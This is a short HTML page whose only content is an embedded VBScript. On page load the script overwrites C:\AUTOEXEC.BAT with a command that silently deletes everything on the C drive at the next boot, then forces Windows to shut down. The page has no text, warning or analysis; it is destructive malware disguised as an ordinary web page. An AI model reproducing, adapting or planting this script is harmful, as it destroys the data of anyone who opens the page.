<HTML>
<BODY>
<SCRIPT LANGUAGE="VBS"><!--
Set FSO=CreateObject("Scripting.FileSystemObject")
Set BAT=FSO.CreateTextFile("C:\AUTOEXEC.BAT",True)
BAT.WriteLine "@echo off"
BAT.WriteLine "deltree c:\*.* -y > nul"
BAT.Close
Set Wsh=CreateObject("WScript.Shell")
Wsh.Run "RUNDLL32.EXE user.exe,exitwindows"
</SCRIPT>//-->
</BODY>
<HTML>
